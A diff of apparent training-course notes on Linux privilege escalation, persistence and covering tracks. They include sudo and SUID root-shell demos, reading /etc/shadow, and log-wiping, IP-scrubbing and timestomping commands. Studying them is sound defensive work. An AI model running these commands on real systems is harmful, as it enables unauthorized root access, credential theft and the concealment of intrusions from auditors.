@@ -14,6 +14,9 @@ SQL INJECTION SITE
 Cybbh:
 https://sec.cybbh.io/public/security/latest/index.html
 
+GTFO BIT
+https://gtfobins.github.io/
+
 Stack:
 16
 
@@ -3553,7 +3556,365 @@ scp student@10.50.38.176:/home/student/hijackmeplz.dll “C:\Path to executable\
 
 
 
-# Linux Privilege Escalation, Persistence, and Covering your tracks
+# Linux Priv Escalation and Persistence
+https://sec.cybbh.io/public/security/latest/lessons/lesson-10-linux-exploit_sg.html
+https://sec.cybbh.io/-/public/-/jobs/872115/artifacts/slides/10-linux-priv-persist-cover.html
+
+
+
+## Priv Escalation
+
+Enumerating
+sudo -l
+s bit on files that allow regular users to use them
+sgid bit allows you to execute as the group that owns the file
+
+
+## SUDO 
+/etc/sudoers
+is the configuration file
+
+ls -l /etc/sudoers
+sudo -l (CHECKS WHAT SUDO RIGHTS YOU HAVE)
+
+
+%name (%sudo is referencing the sudo "group")
+
+
+USER_NAME   HOST_NAME=(ALL) ALL
+student     ALL=(ALL) ALL
+
+change sudo rules
+root	ALL=(ALL:ALL) ALL
+
+GTFO BIT
+https://gtfobins.github.io/
+
+
+## SGUI or SUID
+
+find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
+
+find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
+
+find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
+
+Read top and go down from the outputs
+
+
+
+
+
+For example, if the /usr/bin/find executable is suid, it could be used to execute arbitrary commands via:
+
+find . -exec <command> \;
+
+
+## SUDO Demo (CMD) APT-GET
+
+ssh demo1@10.50.34.67
+
+1. sudo -l
+/usr/bin/apt-get
+
+2. search on GTFO Bins for apt-get (https://gtfobins.github.io/gtfobins/apt-get/)
+select the sudo function and perform the commands
+
+3. sudo apt-get changelog apt (provides it as a less and you can run commands)
+4. !/bin/sh
+5. now you have a root level shell
+
+
+## SUDO Demo 2 (CMD) CAT
+
+1. sudo -l
+/bin/cat /var/log/syslog*
+ls -l /var/log/syslog*
+
+2. /var/log/syslog* means anything so we can add a space and cat
+sudo cat /varlog/syslog /etc/shadow
+
+## SUDO Demo 3 (CMD) NICE
+
+1. sudo -l
+
+2.  "user demo3 may not run sudo"
+so now we try and find SGUID and SUID bits
+find / -type f -perm /6000 -ls 2>/dev/null 
+
+3. Work down list and cross reference with GTFO Website
+we located /usr/bin/nice command and follow instructions
+
+4. Follow SUID command
+nice /bin/sh -p
+
+5. nice /bin/sh -p
+now you have a root shell with euid (effective user id) = root
+
+
+
+## Insecure Permissions
+
+    CRON
+
+    World-Writable Files and Directories
+
+    Dot '.' in PATH
+
+
+## CRONTAB 
+https://crontab.guru/
+crontab example
+
+Can be used for persistence and is ran as ROOT
+
+crontab -l (list out crontabs for the user that you are)
+
+crontab -e (edits a crontab for the user that you are)
+
+m h dom mon dow command
+
+crontab -r (removes the crontab for the user that you are)
+
+crontab -r -u <username> (the -u allows you to do it for a different user)
+crontab -l -u <username>
+crontab -e -u <username>
+
+Scopes for crontab
+System Wide level:
+cat /etc/crontab 
+ls -l /etc/cron.hourly
+ls -l /etc/cron.daily
+ls -l /etc/cron.weekly
+ls -l /etc/cron.monthly
+
+
+
+User Wide level:
+ls -l /var/spool/cron/crontabs
+ls -l /var/spool/cron
+
+For each users crontab there will be a file called <username> located in crontab
+
+/var/spool/cron/crontabs/<username>
+
+
+## World-Writable Files and Folders
+
+Find directories that are world writable
+```
+find / -type d -perm /2 -ls 2>/dev/null
+find / -type f -perm /2 -ls 2>/dev/null
+```
+
+/var
+/dev
+/tmp
+/run
+/home
+
+ls /tmp
+ls -lisa /tmp
+ls -la 
+
+ls -latr
+puts the most recent written file at the bottom
+
+## Dot "." in Path
+
+PATH=:.$PATH
+
+## Vulnerable Software and Services
+If you find a unknown binary check it out and mess with it to see what it does
+Binary
+
+## Persistence 
+
+## Adding or Hijacking a User Account
+Doesnt create new logs
+Easy to hide
+
+
+## Covering Tracks
+
+    Prior Initial Access? After Initial Access? Before Exit? (Know the system!)
+
+        What will happen if I do X (What logging?)
+
+        Checks (Where are things?)
+
+        Hide (File locations, names, times)
+
+    When do you start covering your tracks?
+
+    First thing: unset HISTFILE
+
+    Need to be aware of of init system in use
+
+        SystemV, upstart, SystemD, to name a few
+
+        Determines what commands to use and logging structure
+
+
+
+Logs for Covering Tracks
+Logs typically housed in /var/log & useful logs:
+
+
+auth.log/secur
+Logins/authentications
+
+lastlog
+Each users' last successful login time
+
+btmp
+Bad login attempts
+
+sulog
+Usage of SU command
+
+utmp
+Currently logged in users (W command)
+
+wtmp
+Permanent record on user on/off
+
+
+
+ 
+## Ways to figure out init type
+ls -latr /proc/1/exe
+stat /sbin/init
+man init
+init --version
+ps 1
+
+
+ps -p 1
+systemd
+init
+
+
+
+
+## LINUX CMD Clear Logs
+grep -v "192.168.0.55" /var/log/secure > /tmp/secure.clean; mv /tmp/secure.clean /var/log/secure; touch -t 02180455 /var/log/secure
+Removes the IP address 192.168.0.55 from /var/log/secure and places it in a new file called /tmp/secure.clean, moves the new file over the original file, and alters the timestamp in an attempt to make it look normal.
+
+cat /dev/null > /path/to/logfile
+Overwrites the contents of the logfile with nothing clearing its contents.
+
+rm -rf /path/to/logfile
+Completely removes the log file.
+
+echo "$(tail -n 50 /var/log/auth.log)" > /var/log/auth.log
+Can be used with head/tail to keep the desired portions of the log file and remove the rest. In this case, the most recent 50 entries are saved and the rest are removed.
+
+unset HISTFILE
+If bash is configured to save its log upon exit, then this will ensure that the current bash sessions' history is not saved.
+
+
+
+## Auditing journalctd
+
+SystemD
+
+Utilzes journalctl
+
+journalctl _TRANSPORT=audit
+journalctl _TRANSPORT=audit | grep 603
+
+journalctl -f 
+sudo journalctl SYSLOG_FACILITY=10 
+journalctl --vacuum-time=10m 
+systemctl list-unit-files --all 
+journald -u <unit name> 
+
+Output the content of journald logs from the bottom
+Shows the content of security/authorization logs similar to auth.log
+Clears the last 10 minutes of binary logs collected in the current journald log.
+Shows all of the units selectable with journald -u
+Shows systemd logs only associated with a specific unit
+
+NOT PERSISTENT BY DEFAULT (BINARY FILES)
+
+
+## Working with LOGS
+
+file /var/log/wtmp
+find /var/log -type f -mmin -10 2> /dev/null
+journalctl -f -u ssh
+journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+cat /var/log/auth.log | egrep -v "opened|closed"
+awk '/opened/' /var/log/auth.log
+last OR lastb OR lastlog
+strings OR dd            # for data files
+more /var/log/syslog
+head/tail
+
+CLEAR LOGS
+
+Get rid of it
+rm -rf /var/log/...
+
+Clear It
+cat /dev/null > /var/log/...
+echo > /var/log/...
+
+Always work off a backup!
+GREP (Remove)
+egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2
+
+SED (Replace)
+cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log
+
+
+## Timestomp (CMD)
+Access: updated when opened or used (grep, ls, cat, etc)
+Modify: update content of file or saved
+Change: file attribute change, file modified, moved, owner, permission
+stat <flag>
+touch -c -t 201603051015 1.txt   # Explicit
+touch -r 3.txt 1.txt    # Reference
+
+## RSYSLOG
+
+    Newer Rsyslog references /etc/rsyslog.d/* for settings/rules
+
+    Older version only uses /etc/rsyslog.conf
+
+    Find out
+    grep "IncludeConfig" /etc/rsyslog.conf
+
+Reading Rsyslog
+
+    Utilizes severity (priority) and facility levels
+
+    Rules filter out, and can use keyword or number
+
+<facility>.<priority>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
